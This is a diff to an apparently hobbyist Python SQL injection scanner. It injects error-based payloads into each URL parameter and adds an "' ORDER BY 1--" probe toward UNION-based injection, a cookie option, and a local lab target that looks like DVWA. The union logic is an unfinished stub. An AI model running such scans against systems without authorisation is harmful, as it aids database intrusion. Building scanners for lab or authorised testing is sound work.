@@ -58,35 +58,69 @@ def test_sqli_errors(url, params):
     
     if found:
         print("INJECTION ERROR BASE FOUND FOR MYSQL")
-        return
+        return found
 
     #SQLite
     sqli_list = SQLITE_ERROR["errors"]
-    for injection in sqli_list:
-        new_url = f"{url}{injection}"
-        print("[!] Trying", new_url)
+    for parameter, value in params:
+        for injection in sqli_list:
+            pos = get_insertion_position(url, parameter)
+            if pos == None:
+                continue
+            new_url = url[:pos] + injection + url[pos:]
+            print("[!] Trying", new_url)
 
-        try:
-            res = s.get(new_url)
-        except Exception as e:
-            print(f"[!] Failed to get {new_url}: {e}")
-            exit(1)
-        if is_vulnerable_errors(res):
-            print("[+] SQL Injection vulnerability detected, link:", new_url)
-            found = True
+            try:
+                res = s.get(new_url)
+            except Exception as e:
+                print(f"[!] Failed to get {new_url}: {e}")
+                exit(1)
+            if is_vulnerable_errors(res):
+                print("[+] SQL Injection vulnerability detected, link:", new_url)
+                found = True
     if found:
-        print("INJECTION ERROR BASE FOUND FOR SQLITE")
-        return
-    return
+         print("INJECTION ERROR BASE FOUND FOR SQLITE")
+         return found
+    return found
 
 def parse_sql(url):
     parsed = urlparse(url)
     params = parse_qsl(parsed.query, keep_blank_values=True)
     return params
 
+def find_nb_args(url, params):
+
+        working_params = set()
+        injection = "' ORDER BY 1--"
+        for parameter, value in params:
+            pos = get_insertion_position(url, parameter)
+            if pos == None:
+                continue
+            new_url = url[:pos] + injection + url[pos:]
+            try:
+                res = s.get(new_url)
+            except Exception as e:
+                print(f"[!] Failed to get {new_url}: {e}")
+                exit(1)
+            if is_vulnerable_errors(res):
+                working_params.add((parameter, value))
+
+        for parameter, value in working_params:
+            print(f"working params: {parameter}, {value}")
+
+
+
+def test_sqli_union(url , params):
+
+        nb_args = find_nb_args(url, params);
+
+
 def scan_sql_injection(url):
     params = parse_sql(url)
-    test_sqli_errors(url, params)
+    is_err_injectable = test_sqli_errors(url, params)
+    if (is_err_injectable):
+        #is_bool_injectable = test_sqli_boolean(url, params)
+        is_union_injectable = test_sqli_union(url, params)
 
 def parse_arg():
     parser = argparse.ArgumentParser(description="SQLI Scanner")
@@ -101,9 +135,16 @@ def parse_arg():
         action="store",
         help="type of http request to test, GET by default",
         default="GET")
+    parser.add_argument(
+        "-C",
+        action="store",
+        help="Cookies to be send to the given URL, as Key=Value, each Key/value pair must be separated by a ';'",
+        default=""
+    )
     return parser.parse_args()
 
-def create_session(url):
+
+def create_session(url, cookies):
     s = requests.Session()
     s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
     try:
@@ -111,11 +152,34 @@ def create_session(url):
     except Exception as e:
         print(f"[!] Failed to get {url}: {e}")
         exit(1)
-    #print(s.cookies.get_dict())
+    if not cookies == "":
+        print(f"Cookies={cookies}")
+        pairs = cookies.split(";")
+        result = {}
+
+        for pair in pairs:
+            pair = pair.strip()
+            if '=' not in pair:
+                raise ValueError(f"Invalid pair '{pair}': '=' not found. Cookies will be ignored")
+            key, value = pair.split('=', 1)
+            key = key.strip()
+            value = value.strip()
+
+            result[key] = value
+        
+        s.cookies.clear()
+        for key, value in result.items():
+            print(f"Cookies set:{key}={value}")
+            s.cookies.set(key, value)
+            
+
     return s
 
 if __name__ == "__main__":
-    url = "http://testphp.vulnweb.com/search.php?test=query"
+    url = "http://localhost:4243/vulnerabilities/sqli/?id=1&Submit=Submit#"
     args = parse_arg()
-    s = create_session(url)
+    try:
+        s = create_session(url, args.C)
+    except Exception as e:
+        print(f"Error during session creation:{e}")
     scan_sql_injection(url)
